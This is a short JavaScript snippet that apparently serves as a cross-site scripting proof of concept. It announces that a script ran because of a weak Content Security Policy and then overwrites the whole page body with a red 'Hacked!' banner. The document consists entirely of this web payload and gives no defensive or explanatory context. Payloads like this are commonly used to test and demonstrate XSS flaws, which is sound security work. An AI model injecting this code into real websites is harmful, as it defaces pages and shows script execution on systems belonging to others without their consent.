alert("XSS via Weak CSP - Script Executed!");
document.body.innerHTML = "<h1 style='color:red'>Hacked!</h1>";
